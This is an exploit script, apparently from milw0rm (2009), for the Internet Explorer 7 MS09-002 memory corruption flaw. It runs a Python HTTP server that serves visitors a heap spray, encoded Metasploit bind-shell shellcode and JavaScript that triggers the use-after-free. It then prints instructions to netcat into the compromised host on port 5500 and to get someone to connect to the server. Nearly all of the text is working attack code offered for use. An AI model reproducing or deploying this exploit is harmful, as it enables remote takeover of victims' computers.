#!/usr/bin/env python
###############################################################################
# MS Internet Explorer 7 Memory Corruption Exploit (MS09-002)    	      #				 		 				 				    
###############################################################################
#									      #
# Thanks to str0ke for finding this in the wild.			      #
#				 				 	      #
# Tested on Windows 2003 SP2 R2 				 	      #
#				 				 	      #
# Written by SecureState R&D Team (ReL1K)			 	      #
# http://www.securestate.com				 		      #
#									      #
# win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind #
#									      #
###############################################################################
from BaseHTTPServer import HTTPServer
from BaseHTTPServer import BaseHTTPRequestHandler
import sys
try:
  import psyco
  psyco.full()
except ImportError:
   pass
class myRequestHandler(BaseHTTPRequestHandler):
 try:
  def do_GET(self):
    # Always Accept GET
    self.printCustomHTTPResponse(200)
    # Site root: Main Menu
    if self.path == "/":
       target=self.client_address[0]
       self.wfile.write("""<html><head>""")
       self.wfile.write("""<div id="replace">x</div>
<script language="JavaScript">

//  win32_bind -  EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai http://metasploit.com */
var c = unescape("%ud9db%u74d9%uf424%uc929%u51b1%u02bf%u6c21%u588e%u7831%u8317%u04c0%u7a03%u8e32%u867b%ua55e%u9ec9%uc666%ua12d%ub2f9%u79be%u4fde%ubd7b%u2c95%uc581%u23a8%u7a02%u30b3%ua44a%uadc2%u2f3c%ubaf0%uc1be%u7cc8%ub159%ubdaf%uce2e%uf76e%ud1c2%ue3b2%uea29%ud066%u79f9%u9362%ua5a5%u4f6d%u2e3f%uc461%u6f4b%udb66%u8ca0%u50ba%ufebf%u7ae6%u3da1%u59d7%u4a45%u6e5b%u0c0d%u0550%u9061%u92c5%ua0c2%ucd4b%ufe4c%ue17d%u0101%u9f57%u9bf2%u5330%u0bc7%ue0b6%u9415%uf86c%u428a%ueb46%ua9d7%u0b08%u92f1%u1621%uad98%ud1df%uf867%ue075%ud298%u3de2%u276f%uea5f%u118f%u46f3%uce23%u2ba7%ub390%u5314%u55c6%ubef3%uff9b%u4850%u6a82%uee3e%ue45f%ub978%ud2a0%u56ed%u8f0e%u860e%u8bd8%u095c%u84f0%u8061%u7f51%ufd61%u9a3e%u78d4%u33f7%u5218%uef58%u0eb2%udfa6%ud9a8%ua6bf%u6008%ua717%uc643%u8768%u830a%u41f2%u30bb%u0496%uddde%u4f38%uee08%u8830%uaa20%ub4cb%uf284%u923f%ub019%u1c92%u19a7%u6d7e%u5a52%uc62b%uf208%ue659%u15fc%u6361%ue547%ud04b%u4b10%ub725%u01cf%u66c4%u80a1%u7797%u4391%u5eb5%u5a17%u9f96%u08ce%ua0e6%u33d8%ud5c8%u3070%u2d6a%u371a%uffbb%u171c%u0f2c%u9c68%ubcf2%u4b92%u92f3");

var array = new Array(); 

var ls = 0x100000-(c.length*2+0x01020); 

var b = unescape("%u0C0C%u0C0C"); 
while(b.length<ls/2) { b+=b;} 
var lh = b.substring(0,ls/2); 
delete b; 

for(i=0; i<0xC0; i++) { 
	array[i] = lh + c;
} 

CollectGarbage();

var s1=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
var a1 = new Array();
for(var x=0;x<1000;x++) a1.push(document.createElement("img"));

function ok() { 
	o1=document.createElement("tbody"); 
	o1.click; 
	var o2 = o1.cloneNode();	
	o1.clearAttributes(); 
	o1=null; CollectGarbage(); 
	for(var x=0;x<a1.length;x++) a1[x].src=s1; 
	o2.click;
}
</script><script>window.setTimeout("ok();",800);</script>""")
       self.wfile.write("""<title>Microsoft Internet Explorer MS09-002 Buffer Overflow</title></head><body>""")
       self.wfile.write("""<left><body bgcolor="Black"><font color="White"><p>Exploit is running...</p><br>""")
       print ("\n\n[-] Exploit sent... [-]\n[-] Wait about 30 seconds and attempt to connect.[-]\n[-]NetCat to IP Address: %s and port 5500 [-]" % (target))
       #print ("[-] Example: open up a command shell and type 'nc %s 5500' [-]" % (target))
  # Print custom HTTP Response
  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

 # In case of exceptions, pass them
 except Exception:
    pass
httpd = HTTPServer(('', 80), myRequestHandler)
print ("""
###############################################################################
 
      MS Internet Explorer 7 Memory Corruption Exploit (MS09-002)             				 				 				 				    
###############################################################################
#									      #
# Thanks to Str0ke for finding this in the wild.			      #
#				 				 	      #
# Tested on Windows 2003 SP2 R2 				 	      #
#				 				 	      #
# Written by SecureState R&D Team        			 	      #
# http://www.securestate.com				 		      #
#									      #
# win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind #
#									      #
###############################################################################
""")
print ("[-] Starting MS Internet Explorer 7 Memory Corruption Exploit:80 [-]")
print ("[-] Have someone connect to you on port 80 [-]")
print ("Type <control>-c to exit..")
try:
     # handle the connections
     httpd.handle_request()
     # Serve HTTP server forever
     httpd.serve_forever() 
# Except Keyboard Interrupts and throw custom message
except KeyboardInterrupt:
   print ("\n\nExiting exploit...\n\n")
   sys.exit()

# milw0rm.com [2009-02-20]
